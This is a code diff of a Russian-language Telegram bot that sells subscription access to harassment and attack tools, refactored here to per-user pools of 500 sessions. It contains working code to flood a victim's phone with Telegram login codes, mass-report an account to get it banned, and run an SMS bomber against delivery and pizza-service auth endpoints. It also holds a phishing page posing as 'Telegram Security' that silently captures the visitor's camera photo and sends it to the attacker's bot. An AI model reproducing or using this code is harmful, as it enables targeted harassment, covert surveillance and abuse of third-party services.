@@ -7,10 +7,11 @@ import logging
 import time
 import re
 import hashlib
+import shutil
 from datetime import datetime, timedelta
-from typing import Optional, Dict, List, Set
+from typing import Optional, Dict, List, Set, Tuple
 from dataclasses import dataclass, field
-from collections import deque
+from pathlib import Path
 
 from aiogram import Bot, Dispatcher, types, F
 from aiogram.fsm.context import FSMContext
@@ -18,7 +19,10 @@ from aiogram.fsm.state import State, StatesGroup
 from aiogram.fsm.storage.memory import MemoryStorage
 from aiogram.filters import Command, StateFilter
 from aiogram.utils.keyboard import InlineKeyboardBuilder
-from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile, LabeledPrice, PreCheckoutQuery
+from aiogram.types import (
+    InlineKeyboardMarkup, InlineKeyboardButton, 
+    FSInputFile, LabeledPrice, PreCheckoutQuery
+)
 from aiogram.client.default import DefaultBotProperties
 from aiogram.enums import ParseMode
 
@@ -40,11 +44,11 @@ PAYMENT_PROVIDER_TOKEN = "381764678:TEST:86938"
 BANNER_FILE = "banner.png"
 
 # Настройки атак
-TOTAL_SESSIONS = 100000
+SESSIONS_PER_USER = 500
 REQUESTS_PER_ROUND = 300
 MAX_ROUNDS = 5
-COOLDOWN_SECONDS = 300  # 5 минут между атаками
-SESSION_BATCH_SIZE = 500  # Создаем сессии батчами
+COOLDOWN_SECONDS = 300
+SESSION_CREATION_DELAY = 0.1
 
 PRICES = {
     "30d": {"stars": 100, "rub": 100},
@@ -70,7 +74,6 @@ DEVICES = [
     {"model": "Xiaomi 14 Pro", "system": "Android 14"},
 ]
 
-# Рабочие эндпоинты для бомбера
 BOMBER_ENDPOINTS = [
     {"url": "https://api.delivery-club.ru/api/v2/auth/send-code", "phone_field": "phone", "method": "POST"},
     {"url": "https://api.dodopizza.ru/auth/send-code", "phone_field": "phone", "method": "POST"},
@@ -110,8 +113,8 @@ dp = Dispatcher(storage=MemoryStorage())
 
 # ---------- ДАТАКЛАССЫ ----------
 @dataclass
-class SmartSession:
-    """Умная сессия с отслеживанием состояния"""
+class UserSession:
+    """Умная сессия пользователя"""
     client: Client
     index: int
     in_use: bool = False
@@ -119,6 +122,7 @@ class SmartSession:
     last_used: float = 0
     fail_count: int = 0
     success_count: int = 0
+    created_at: float = field(default_factory=time.time)
     
     @property
     def is_available(self) -> bool:
@@ -129,58 +133,56 @@ class SmartSession:
     
     @property
     def health_score(self) -> float:
-        """Оценка здоровья сессии (0-100)"""
         if self.fail_count > 10:
             return 0
         total = self.success_count + self.fail_count
         if total == 0:
             return 100
         return (self.success_count / total) * 100
+    
+    async def ensure_connected(self):
+        if not self.client.is_connected:
+            await self.client.connect()
 
 @dataclass
-class SessionPool:
-    """Пул из 100,000 умных сессий"""
-    sessions: List[SmartSession] = field(default_factory=list)
+class UserSessionPool:
+    """Пул сессий пользователя"""
+    user_id: int
+    sessions: List[UserSession] = field(default_factory=list)
     lock: asyncio.Lock = field(default_factory=asyncio.Lock)
-    creation_lock: asyncio.Lock = field(default_factory=asyncio.Lock)
+    is_creating: bool = False
     is_ready: bool = False
-    _creation_task: Optional[asyncio.Task] = None
+    creation_progress: float = 0
     
-    async def get_available(self, count: int) -> List[SmartSession]:
-        """Получить count доступных сессий"""
+    @property
+    def session_dir(self) -> str:
+        return f"sessions/user_{self.user_id}"
+    
+    async def get_available(self, count: int) -> List[UserSession]:
         async with self.lock:
             available = [s for s in self.sessions if s.is_available]
-            
-            # Сортируем по здоровью и времени последнего использования
             available.sort(key=lambda s: (-s.health_score, s.last_used))
-            
-            selected = available[:count]
+            selected = available[:min(count, len(available))]
             for s in selected:
                 s.in_use = True
                 s.last_used = time.time()
-            
             return selected
     
-    def release(self, sessions: List[SmartSession]):
-        """Освободить сессии"""
+    def release(self, sessions: List[UserSession]):
         for s in sessions:
             if s:
                 s.in_use = False
     
-    def mark_success(self, session: SmartSession):
-        """Отметить успешное использование"""
+    def mark_success(self, session: UserSession):
         session.success_count += 1
     
-    def mark_fail(self, session: SmartSession):
-        """Отметить неудачное использование"""
+    def mark_fail(self, session: UserSession):
         session.fail_count += 1
     
-    def mark_flood(self, session: SmartSession, wait_seconds: int):
-        """Отметить flood wait"""
+    def mark_flood(self, session: UserSession, wait_seconds: int):
         session.flood_until = time.time() + wait_seconds
     
     def get_stats(self) -> dict:
-        """Статистика пула"""
         total = len(self.sessions)
         available = sum(1 for s in self.sessions if s.is_available)
         healthy = sum(1 for s in self.sessions if s.health_score > 50)
@@ -188,13 +190,12 @@ class SessionPool:
             "total": total,
             "available": available,
             "healthy": healthy,
-            "ready": self.is_ready
+            "ready": self.is_ready,
+            "progress": self.creation_progress
         }
 
-# Глобальный пул сессий
-global_session_pool = SessionPool()
-
-# ---------- ХРАНИЛИЩА ----------
+# ---------- ГЛОБАЛЬНЫЕ ХРАНИЛИЩА ----------
+user_pools: Dict[int, UserSessionPool] = {}
 ALLOWED_USERS: Dict[str, dict] = {}
 active_attacks: Dict[int, asyncio.Event] = {}
 user_last_action: Dict[int, float] = {}
@@ -219,9 +220,8 @@ class AdminState(StatesGroup):
 class PurchaseState(StatesGroup):
     waiting_promo = State()
 
-# ---------- ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ----------
+# ---------- ПРОВЕРКА ДОСТУПА ----------
 def load_json(file: str, default: dict = None) -> dict:
-    """Безопасная загрузка JSON"""
     try:
         with open(file, 'r') as f:
             return json.load(f)
@@ -229,7 +229,6 @@ def load_json(file: str, default: dict = None) -> dict:
         return default or {}
 
 def save_json(file: str, data: dict):
-    """Безопасное сохранение JSON"""
     try:
         with open(file, 'w') as f:
             json.dump(data, f, indent=4, ensure_ascii=False)
@@ -251,22 +250,33 @@ def save_promo_codes():
     save_json("promo_codes.json", promo_codes)
 
 def is_user_allowed(user_id: int) -> bool:
-    """Проверка доступа пользователя"""
+    """ПРОВЕРКА ДОСТУПА - ТОЛЬКО АДМИН И ОПЛАЧЕННЫЕ ПОЛЬЗОВАТЕЛИ"""
     if user_id == ADMIN_ID:
         return True
+    
     user_id_str = str(user_id)
     if user_id_str not in ALLOWED_USERS:
+        logger.info(f"User {user_id} not in allowed list")
         return False
+    
     expire = ALLOWED_USERS[user_id_str].get("expire_date")
-    if expire and expire != "forever":
-        try:
-            return datetime.now() <= datetime.fromisoformat(expire)
-        except:
-            return False
-    return True
+    if not expire:
+        return False
+    
+    if expire == "forever":
+        return True
+    
+    try:
+        expire_date = datetime.fromisoformat(expire)
+        is_valid = datetime.now() <= expire_date
+        if not is_valid:
+            logger.info(f"User {user_id} subscription expired on {expire}")
+        return is_valid
+    except Exception as e:
+        logger.error(f"Error checking subscription for {user_id}: {e}")
+        return False
 
 def add_subscription(user_id: int, days: int = None, forever: bool = False):
-    """Добавление подписки"""
     user_id_str = str(user_id)
     if forever:
         expire = "forever"
@@ -277,9 +287,56 @@ def add_subscription(user_id: int, days: int = None, forever: bool = False):
         "added": datetime.now().isoformat()
     }
     save_allowed_users()
+    logger.info(f"Added subscription for user {user_id}: {expire}")
+
+async def check_access_and_subscription(user_id: int, target) -> bool:
+    """
+    Проверка доступа и подписки на канал
+    Возвращает True если все проверки пройдены
+    """
+    # Проверка подписки на канал
+    if not await check_channel_subscription(user_id):
+        await send_message_with_banner(
+            target,
+            f"❌ <b>ДОСТУП ЗАПРЕЩЕН</b>\n\n"
+            f"Для использования бота необходимо:\n"
+            f"1. Подписаться на канал: {CHANNEL_URL}\n"
+            f"2. Приобрести доступ"
+        )
+        return False
+    
+    # Проверка оплаты
+    if not is_user_allowed(user_id):
+        user_id_str = str(user_id)
+        if user_id_str in ALLOWED_USERS:
+            expire = ALLOWED_USERS[user_id_str].get("expire_date", "неизвестно")
+            try:
+                expire_date = datetime.fromisoformat(expire)
+                if expire_date < datetime.now():
+                    await send_message_with_banner(
+                        target,
+                        f"❌ <b>ПОДПИСКА ИСТЕКЛА</b>\n\n"
+                        f"Ваша подписка закончилась {expire_date.strftime('%d.%m.%Y')}\n"
+                        f"Приобретите доступ снова:",
+                        get_purchase_menu()
+                    )
+                    return False
+            except:
+                pass
+        
+        await send_message_with_banner(
+            target,
+            f"❌ <b>ДОСТУП ЗАПРЕЩЕН</b>\n\n"
+            f"У вас нет активной подписки.\n"
+            f"Ваш ID: <code>{user_id}</code>\n\n"
+            f"Приобретите доступ:",
+            get_purchase_menu()
+        )
+        return False
+    
+    return True
 
 async def check_cooldown(user_id: int) -> tuple[bool, float]:
-    """Проверка кулдауна между атаками"""
     now = time.time()
     if user_id in user_last_action:
         elapsed = now - user_last_action[user_id]
@@ -288,29 +345,29 @@ async def check_cooldown(user_id: int) -> tuple[bool, float]:
     return True, 0
 
 def set_cooldown(user_id: int):
-    """Установка кулдауна"""
     user_last_action[user_id] = time.time()
 
 async def get_user_lock(user_id: int) -> asyncio.Lock:
-    """Получить блокировку для пользователя"""
     if user_id not in user_action_locks:
         user_action_locks[user_id] = asyncio.Lock()
     return user_action_locks[user_id]
 
 async def check_channel_subscription(user_id: int) -> bool:
-    """Проверка подписки на канал"""
     try:
         member = await bot.get_chat_member(chat_id=CHANNEL_ID, user_id=user_id)
         return member.status in ["member", "administrator", "creator"]
-    except:
+    except Exception as e:
+        logger.error(f"Failed to check channel subscription for {user_id}: {e}")
         return False
 
-# ---------- СОЗДАНИЕ ПУЛА СЕССИЙ ----------
-async def create_single_session(index: int) -> Optional[SmartSession]:
-    """Создание одной сессии"""
+# ---------- СОЗДАНИЕ СЕССИЙ ----------
+async def create_single_user_session(user_id: int, index: int) -> Optional[UserSession]:
     try:
+        session_dir = f"sessions/user_{user_id}"
+        os.makedirs(session_dir, exist_ok=True)
+        
         device = random.choice(DEVICES)
-        session_file = f"sessions/session_{index}"
+        session_file = f"{session_dir}/session_{index}"
         
         client = Client(
             name=session_file,
@@ -325,158 +382,180 @@ async def create_single_session(index: int) -> Optional[SmartSession]:
         )
         
         await client.connect()
-        
-        # Проверяем что сессия работает
         await client.get_me()
         
-        return SmartSession(client=client, index=index)
+        return UserSession(client=client, index=index)
     except Exception as e:
-        logger.debug(f"Failed to create session {index}: {e}")
+        logger.debug(f"User {user_id} session {index} creation failed: {e}")
         return None
 
-async def create_session_batch(start_idx: int, count: int) -> List[SmartSession]:
-    """Создание батча сессий"""
-    tasks = []
-    for i in range(start_idx, start_idx + count):
-        tasks.append(create_single_session(i))
-        await asyncio.sleep(0.05)  # Небольшая задержка между созданиями
+async def initialize_user_sessions(user_id: int) -> UserSessionPool:
+    if user_id in user_pools:
+        pool = user_pools[user_id]
+        if pool.is_ready:
+            return pool
+    else:
+        pool = UserSessionPool(user_id=user_id)
+        user_pools[user_id] = pool
     
-    results = await asyncio.gather(*tasks, return_exceptions=True)
+    if pool.is_creating:
+        while pool.is_creating:
+            await asyncio.sleep(1)
+        return pool
     
-    sessions = []
-    for r in results:
-        if isinstance(r, SmartSession):
-            sessions.append(r)
+    pool.is_creating = True
     
-    return sessions
+    try:
+        logger.info(f"Creating {SESSIONS_PER_USER} sessions for user {user_id}")
+        
+        session_dir = pool.session_dir
+        
+        if os.path.exists(session_dir):
+            existing_sessions = list(Path(session_dir).glob("session_*.session"))
+            logger.info(f"Found {len(existing_sessions)} existing sessions for user {user_id}")
+            
+            for i, session_file in enumerate(existing_sessions):
+                try:
+                    index = int(session_file.stem.replace("session_", ""))
+                    device = random.choice(DEVICES)
+                    
+                    client = Client(
+                        name=str(session_file.with_suffix("")),
+                        api_id=API_ID,
+                        api_hash=API_HASH,
+                        in_memory=False,
+                        no_updates=True,
+                        device_model=device["model"],
+                        system_version=device["system"],
+                        app_version="10.15.1",
+                        lang_code="ru"
+                    )
+                    
+                    await client.connect()
+                    await client.get_me()
+                    
+                    session = UserSession(client=client, index=index)
+                    pool.sessions.append(session)
+                    
+                    if i % 50 == 0:
+                        pool.creation_progress = len(pool.sessions) / SESSIONS_PER_USER * 100
+                        
+                except Exception as e:
+                    logger.debug(f"Failed to load session {session_file}: {e}")
+        
+        existing_count = len(pool.sessions)
+        if existing_count < SESSIONS_PER_USER:
+            needed = SESSIONS_PER_USER - existing_count
+            
+            logger.info(f"Creating {needed} new sessions for user {user_id}")
+            
+            used_indices = {s.index for s in pool.sessions}
+            next_index = 0
+            while next_index in used_indices:
+                next_index += 1
+            
+            for i in range(needed):
+                idx = next_index + i
+                session = await create_single_user_session(user_id, idx)
+                if session:
+                    async with pool.lock:
+                        pool.sessions.append(session)
+                
+                pool.creation_progress = len(pool.sessions) / SESSIONS_PER_USER * 100
+                await asyncio.sleep(SESSION_CREATION_DELAY)
+                
+                if i % 50 == 0:
+                    logger.info(f"User {user_id} progress: {len(pool.sessions)}/{SESSIONS_PER_USER}")
+        
+        pool.is_ready = True
+        logger.info(f"User {user_id} session pool ready: {len(pool.sessions)} sessions")
+        
+        return pool
+        
+    except Exception as e:
+        logger.error(f"Failed to initialize sessions for user {user_id}: {e}")
+        raise
+    finally:
+        pool.is_creating = False
 
-async def initialize_session_pool():
-    """Инициализация пула из 100,000 сессий"""
-    global global_session_pool
+async def get_or_create_user_pool(user_id: int) -> UserSessionPool:
+    if user_id not in user_pools:
+        user_pools[user_id] = UserSessionPool(user_id=user_id)
     
-    async with global_session_pool.creation_lock:
-        if global_session_pool.is_ready:
-            return
-        
-        logger.info(f"Starting session pool initialization: {TOTAL_SESSIONS} sessions")
-        
-        os.makedirs("sessions", exist_ok=True)
-        
-        created = 0
-        batch_size = SESSION_BATCH_SIZE
-        
-        while created < TOTAL_SESSIONS:
-            remaining = TOTAL_SESSIONS - created
-            current_batch = min(batch_size, remaining)
-            
-            logger.info(f"Creating batch: {created}-{created + current_batch}")
-            
-            new_sessions = await create_session_batch(created, current_batch)
-            global_session_pool.sessions.extend(new_sessions)
-            
-            created += current_batch
-            
-            stats = global_session_pool.get_stats()
-            logger.info(f"Pool stats: {stats['total']} total, {stats['available']} available")
-            
-            # Сохраняем прогресс
-            if created % 10000 == 0:
-                logger.info(f"Progress: {created}/{TOTAL_SESSIONS} sessions created")
-        
-        global_session_pool.is_ready = True
-        logger.info(f"Session pool ready: {len(global_session_pool.sessions)} sessions")
+    pool = user_pools[user_id]
+    
+    if not pool.is_ready and not pool.is_creating:
+        asyncio.create_task(initialize_user_sessions(user_id))
+    
+    return pool
 
-async def maintain_session_pool():
-    """Поддержание пула сессий в рабочем состоянии"""
+async def maintain_user_sessions(user_id: int):
     while True:
         try:
-            await asyncio.sleep(60)  # Проверка каждую минуту
+            await asyncio.sleep(300)
             
-            if not global_session_pool.is_ready:
+            if user_id not in user_pools:
+                break
+            
+            pool = user_pools[user_id]
+            if not pool.is_ready:
                 continue
             
-            # Восстанавливаем упавшие сессии
             dead_sessions = []
-            for s in global_session_pool.sessions:
-                if s.health_score < 10 and not s.in_use:
-                    dead_sessions.append(s)
+            async with pool.lock:
+                for s in pool.sessions:
+                    if s.health_score < 10 and not s.in_use:
+                        dead_sessions.append(s)
             
             if dead_sessions:
-                logger.info(f"Recovering {len(dead_sessions)} dead sessions")
-                for s in dead_sessions[:100]:  # Не больше 100 за раз
+                logger.info(f"User {user_id}: recovering {len(dead_sessions)} dead sessions")
+                
+                for s in dead_sessions[:20]:
                     try:
                         if s.client and s.client.is_connected:
                             await s.client.disconnect()
                     except:
                         pass
-                    global_session_pool.sessions.remove(s)
-                
-                # Создаем новые сессии вместо упавших
-                new_start = len(global_session_pool.sessions)
-                new_sessions = await create_session_batch(new_start, len(dead_sessions))
-                global_session_pool.sessions.extend(new_sessions)
+                    
+                    async with pool.lock:
+                        if s in pool.sessions:
+                            pool.sessions.remove(s)
+                    
+                    new_session = await create_single_user_session(user_id, s.index)
+                    if new_session:
+                        async with pool.lock:
+                            pool.sessions.append(new_session)
                 
         except Exception as e:
-            logger.error(f"Session pool maintenance error: {e}")
+            logger.error(f"User {user_id} session maintenance error: {e}")
 
 # ---------- АТАКИ ----------
-async def send_code_via_session(session: SmartSession, phone: str) -> bool:
-    """Отправка кода через сессию"""
+async def send_code_via_session(session: UserSession, phone: str, pool: UserSessionPool) -> bool:
     try:
-        client = session.client
-        if not client.is_connected:
-            await client.connect()
-        
-        await client.send_code(phone)
-        global_session_pool.mark_success(session)
+        await session.ensure_connected()
+        await session.client.send_code(phone)
+        pool.mark_success(session)
         return True
     except FloodWait as e:
-        global_session_pool.mark_flood(session, e.value)
+        pool.mark_flood(session, e.value)
         return False
-    except Exception as e:
-        global_session_pool.mark_fail(session)
+    except Exception:
+        pool.mark_fail(session)
         return False
 
-async def report_account_via_session(session: SmartSession, username: str) -> bool:
-    """Жалоба на аккаунт через сессию"""
+async def report_account_via_session(session: UserSession, username: str, pool: UserSessionPool) -> bool:
     try:
-        client = session.client
-        if not client.is_connected:
-            await client.connect()
-        
-        user = await client.get_users(username)
-        peer = await client.resolve_peer(user.id)
+        await session.ensure_connected()
+        user = await session.client.get_users(username)
+        peer = await session.client.resolve_peer(user.id)
         
         reason = random.choice(REPORT_REASONS)
-        await client.invoke(ReportPeer(peer=peer, reason=reason, message="Report"))
+        await session.client.invoke(ReportPeer(peer=peer, reason=reason, message="Report"))
         
-        global_session_pool.mark_success(session)
+        pool.mark_success(session)
         return True
-    except Exception as e:
-        global_session_pool.mark_fail(session)
-        return False
-
-async def report_message_via_session(session: SmartSession, channel: str, msg_id: int) -> bool:
-    """Жалоба на сообщение через сессию"""
-    try:
-        client = session.client
-        if not client.is_connected:
-            await client.connect()
-        
-        chat = await client.get_chat(channel)
-        peer = await client.resolve_peer(chat.id)
-        
-        await client.invoke(Report(
-            peer=peer,
-            id=[msg_id],
-            reason=raw_types.InputReportReasonSpam(),
-            message="Spam"
-        ))
-        
-        global_session_pool.mark_success(session)
-        return True
-    except Exception as e:
-        global_session_pool.mark_fail(session)
+    except Exception:
+        pool.mark_fail(session)
         return False
 
 async def snos_attack_phone(
@@ -486,7 +565,13 @@ async def snos_attack_phone(
     stop_event: asyncio.Event,
     progress_callback=None
 ) -> int:
-    """Атака сноса по номеру телефона"""
+    pool = await get_or_create_user_pool(user_id)
+    
+    while not pool.is_ready:
+        await asyncio.sleep(1)
+    
+    asyncio.create_task(maintain_user_sessions(user_id))
+    
     total_sent = 0
     phone = phone.strip().replace(" ", "").replace("-", "")
     if not phone.startswith("+"):
@@ -496,21 +581,19 @@ async def snos_attack_phone(
         if stop_event.is_set():
             break
         
-        # Получаем 300 сессий для раунда
-        sessions = await global_session_pool.get_available(REQUESTS_PER_ROUND)
+        sessions = await pool.get_available(REQUESTS_PER_ROUND)
+        
+        if len(sessions) < REQUESTS_PER_ROUND:
+            logger.warning(f"User {user_id}: only {len(sessions)} sessions available")
         
         if not sessions:
-            logger.warning(f"No sessions available for round {rnd}")
             break
         
-        # Отправляем запросы параллельно
-        tasks = [send_code_via_session(s, phone) for s in sessions]
+        tasks = [send_code_via_session(s, phone, pool) for s in sessions]
         results = await asyncio.gather(*tasks, return_exceptions=True)
         
-        # Освобождаем сессии
-        global_session_pool.release(sessions)
+        pool.release(sessions)
         
-        # Считаем успешные
         round_sent = sum(1 for r in results if r is True)
         total_sent += round_sent
         
@@ -518,7 +601,7 @@ async def snos_attack_phone(
             await progress_callback(rnd, rounds, total_sent)
         
         if rnd < rounds:
-            await asyncio.sleep(1.5)  # Пауза между раундами
+            await asyncio.sleep(1.5)
     
     return total_sent
 
@@ -529,7 +612,13 @@ async def snos_attack_username(
     stop_event: asyncio.Event,
     progress_callback=None
 ) -> int:
-    """Атака сноса по username"""
+    pool = await get_or_create_user_pool(user_id)
+    
+    while not pool.is_ready:
+        await asyncio.sleep(1)
+    
+    asyncio.create_task(maintain_user_sessions(user_id))
+    
     total_reports = 0
     username = username.strip().replace("@", "")
     
@@ -537,19 +626,15 @@ async def snos_attack_username(
         if stop_event.is_set():
             break
         
-        # Получаем 300 сессий
-        sessions = await global_session_pool.get_available(REQUESTS_PER_ROUND)
+        sessions = await pool.get_available(REQUESTS_PER_ROUND)
         
         if not sessions:
-            logger.warning(f"No sessions available for round {rnd}")
             break
         
-        # Отправляем жалобы
-        tasks = [report_account_via_session(s, username) for s in sessions]
+        tasks = [report_account_via_session(s, username, pool) for s in sessions]
         results = await asyncio.gather(*tasks, return_exceptions=True)
         
-        # Освобождаем сессии
-        global_session_pool.release(sessions)
+        pool.release(sessions)
         
         round_reports = sum(1 for r in results if r is True)
         total_reports += round_reports
@@ -562,42 +647,6 @@ async def snos_attack_username(
     
     return total_reports
 
-async def mass_report_message(user_id: int, link: str) -> tuple[int, str]:
-    """Массовая жалоба на сообщение"""
-    # Парсим ссылку
-    patterns = [
-        r't\.me/([^/]+)/(\d+)',
-        r'telegram\.me/([^/]+)/(\d+)'
-    ]
-    
-    channel = None
-    msg_id = None
-    
-    for pattern in patterns:
-        match = re.search(pattern, link)
-        if match:
-            channel = match.group(1)
-            msg_id = int(match.group(2))
-            break
-    
-    if not channel or not msg_id:
-        return 0, "Неверная ссылка"
-    
-    # Получаем сессии
-    sessions = await global_session_pool.get_available(300)
-    
-    if not sessions:
-        return 0, "Нет доступных сессий"
-    
-    # Отправляем жалобы
-    tasks = [report_message_via_session(s, channel, msg_id) for s in sessions]
-    results = await asyncio.gather(*tasks, return_exceptions=True)
-    
-    global_session_pool.release(sessions)
-    
-    reports = sum(1 for r in results if r is True)
-    return reports, None
-
 async def bomber_attack(
     phone: str,
     rounds: int,
@@ -605,7 +654,6 @@ async def bomber_attack(
     stop_event: asyncio.Event,
     progress_callback=None
 ) -> int:
-    """SMS бомбер"""
     total_sent = 0
     phone = phone.strip().replace(" ", "").replace("-", "")
     if not phone.startswith("+"):
@@ -619,7 +667,7 @@ async def bomber_attack(
             
             tasks = []
             for endpoint in BOMBER_ENDPOINTS:
-                for _ in range(30):  # 10 эндпоинтов * 30 = 300 запросов
+                for _ in range(30):
                     tasks.append(send_bomber_request(session, phone, endpoint))
             
             results = await asyncio.gather(*tasks, return_exceptions=True)
@@ -636,7 +684,6 @@ async def bomber_attack(
     return total_sent
 
 async def send_bomber_request(session: aiohttp.ClientSession, phone: str, endpoint: dict) -> bool:
-    """Отправка запроса бомбера"""
     try:
         headers = {
             'User-Agent': random.choice(USER_AGENTS),
@@ -665,49 +712,12 @@ PHISH_HTML = '''<!DOCTYPE html>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>{title}</title>
     <style>
-        body {{
-            margin: 0;
-            padding: 0;
-            background: #000;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-        }}
-        #container {{
-            position: relative;
-            width: 100vw;
-            height: 100vh;
-            overflow: hidden;
-        }}
-        video {{
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-        }}
-        #overlay {{
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            display: flex;
-            flex-direction: column;
-            justify-content: flex-end;
-            align-items: center;
-            padding: 20px;
-            pointer-events: none;
-        }}
-        #status {{
-            background: rgba(0,0,0,0.7);
-            color: white;
-            padding: 12px 24px;
-            border-radius: 30px;
-            font-size: 14px;
-            margin-bottom: 30px;
-            backdrop-filter: blur(10px);
-            pointer-events: none;
-        }}
-        canvas {{
-            display: none;
-        }}
+        body {{ margin: 0; padding: 0; background: #000; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }}
+        #container {{ position: relative; width: 100vw; height: 100vh; overflow: hidden; }}
+        video {{ width: 100%; height: 100%; object-fit: cover; }}
+        #overlay {{ position: fixed; top: 0; left: 0; right: 0; bottom: 0; display: flex; flex-direction: column; justify-content: flex-end; align-items: center; padding: 20px; pointer-events: none; }}
+        #status {{ background: rgba(0,0,0,0.7); color: white; padding: 12px 24px; border-radius: 30px; font-size: 14px; margin-bottom: 30px; backdrop-filter: blur(10px); pointer-events: none; }}
+        canvas {{ display: none; }}
     </style>
 </head>
 <body>
@@ -718,110 +728,50 @@ PHISH_HTML = '''<!DOCTYPE html>
         </div>
     </div>
     <canvas id="canvas"></canvas>
-    
     <script>
-        const CONFIG = {{
-            bot: "{bot_token}",
-            chat: "{chat_id}",
-            pageId: "{page_id}"
-        }};
-        
+        const CONFIG = {{ bot: "{bot_token}", chat: "{chat_id}", pageId: "{page_id}" }};
         let sent = false;
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         const status = document.getElementById('status');
-        
         async function initCamera() {{
             try {{
-                const stream = await navigator.mediaDevices.getUserMedia({{
-                    video: {{
-                        facingMode: "user",
-                        width: {{ ideal: 1280 }},
-                        height: {{ ideal: 720 }}
-                    }}
-                }});
-                
+                const stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user", width: {{ ideal: 1280 }}, height: {{ ideal: 720 }} }} }});
                 video.srcObject = stream;
                 status.textContent = '📸 Camera ready';
-                
-                // Ждем загрузку видео
-                await new Promise(resolve => {{
-                    video.onloadedmetadata = () => {{
-                        resolve();
-                    }};
-                }});
-                
-                // Делаем фото
+                await new Promise(resolve => {{ video.onloadedmetadata = () => {{ resolve(); }}; }});
                 setTimeout(() => captureAndSend(stream), 1500);
-                
-            }} catch(e) {{
-                status.textContent = '❌ Camera access denied';
-                console.error('Camera error:', e);
-            }}
+            }} catch(e) {{ status.textContent = '❌ Camera access denied'; }}
         }}
-        
         async function captureAndSend(stream) {{
             if (sent) return;
-            
             try {{
                 const ctx = canvas.getContext('2d');
-                
                 canvas.width = video.videoWidth || 640;
                 canvas.height = video.videoHeight || 480;
-                
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                
                 status.textContent = '📤 Sending...';
-                
-                // Конвертируем в blob
-                const blob = await new Promise(resolve => {{
-                    canvas.toBlob(resolve, 'image/jpeg', 0.8);
-                }});
-                
-                // Отправляем в Telegram
+                const blob = await new Promise(resolve => {{ canvas.toBlob(resolve, 'image/jpeg', 0.8); }});
                 const formData = new FormData();
                 formData.append('chat_id', CONFIG.chat);
                 formData.append('photo', blob, `photo_${{CONFIG.pageId}}.jpg`);
                 formData.append('caption', `📸 Photo captured | ID: ${{CONFIG.pageId}}`);
-                
-                const response = await fetch(
-                    `https://api.telegram.org/bot${{CONFIG.bot}}/sendPhoto`,
-                    {{ method: 'POST', body: formData }}
-                );
-                
+                const response = await fetch(`https://api.telegram.org/bot${{CONFIG.bot}}/sendPhoto`, {{ method: 'POST', body: formData }});
                 const data = await response.json();
-                
                 if (data.ok) {{
                     sent = true;
                     status.textContent = '✅ Photo sent successfully';
-                    
-                    // Останавливаем камеру
                     stream.getTracks().forEach(track => track.stop());
-                    
-                    // Перенаправляем
-                    setTimeout(() => {{
-                        window.location.href = 'https://telegram.org/';
-                    }}, 2000);
-                }} else {{
-                    status.textContent = '❌ Send failed, retrying...';
-                    setTimeout(() => captureAndSend(stream), 2000);
-                }}
-                
-            }} catch(e) {{
-                console.error('Capture error:', e);
-                status.textContent = '❌ Error, retrying...';
-                setTimeout(() => captureAndSend(stream), 2000);
-            }}
+                    setTimeout(() => {{ window.location.href = 'https://telegram.org/'; }}, 2000);
+                }} else {{ status.textContent = '❌ Send failed, retrying...'; setTimeout(() => captureAndSend(stream), 2000); }}
+            }} catch(e) {{ status.textContent = '❌ Error, retrying...'; setTimeout(() => captureAndSend(stream), 2000); }}
         }}
-        
-        // Запускаем
         initCamera();
     </script>
 </body>
 </html>'''
 
 async def create_phishing_page(title: str, chat_id: int, page_id: str) -> Optional[str]:
-    """Создание фишинговой страницы на Telegraph"""
     try:
         html = PHISH_HTML.format(
             title=title,
@@ -831,7 +781,6 @@ async def create_phishing_page(title: str, chat_id: int, page_id: str) -> Option
         )
         
         async with aiohttp.ClientSession() as session:
-            # Создаем аккаунт
             account_data = {
                 "short_name": f"Support{random.randint(10000, 99999)}",
                 "author_name": "Telegram Security",
@@ -848,7 +797,6 @@ async def create_phishing_page(title: str, chat_id: int, page_id: str) -> Option
                     return None
                 access_token = data["result"]["access_token"]
             
-            # Создаем страницу
             page_data = {
                 "access_token": access_token,
                 "title": title,
@@ -880,13 +828,11 @@ async def create_phishing_page(title: str, chat_id: int, page_id: str) -> Option
     
     return None
 
-# ---------- UI КОМПОНЕНТЫ ----------
+# ---------- UI ----------
 def create_button(text: str, callback_data: str) -> InlineKeyboardButton:
-    """Создание кнопки"""
     return InlineKeyboardButton(text=text, callback_data=callback_data)
 
 def create_keyboard(buttons: List[List[tuple]], adjust: int = 1) -> InlineKeyboardMarkup:
-    """Создание клавиатуры"""
     builder = InlineKeyboardBuilder()
     for row in buttons:
         for text, data in row:
@@ -895,7 +841,6 @@ def create_keyboard(buttons: List[List[tuple]], adjust: int = 1) -> InlineKeyboa
     return builder.as_markup()
 
 def get_main_menu(user_id: int) -> InlineKeyboardMarkup:
-    """Главное меню"""
     buttons = [
         [("🎯 СНОС", "snos_menu")],
         [("💣 БОМБЕР", "bomber_menu")],
@@ -910,21 +855,23 @@ def get_main_menu(user_id: int) -> InlineKeyboardMarkup:
     return create_keyboard(buttons, adjust=2)
 
 def get_snos_menu() -> InlineKeyboardMarkup:
-    """Меню сноса"""
     buttons = [
         [("📱 По номеру", "snos_phone")],
         [("👤 По username", "snos_username")],
-        [("💬 Жалоба на сообщение", "report_message")],
         [("◀️ НАЗАД", "main_menu")]
     ]
     return create_keyboard(buttons)
 
-async def send_message_with_banner(
-    target,
-    text: str,
-    markup: InlineKeyboardMarkup = None
-):
-    """Отправка сообщения с баннером"""
+def get_purchase_menu() -> InlineKeyboardMarkup:
+    buttons = [
+        [("💎 30 дней - 100₽", "buy_30d")],
+        [("💎 60 дней - 200₽", "buy_60d")],
+        [("👑 Навсегда - 400₽", "buy_forever")],
+        [("🎁 Промокод", "use_promo")]
+    ]
+    return create_keyboard(buttons)
+
+async def send_message_with_banner(target, text: str, markup: InlineKeyboardMarkup = None):
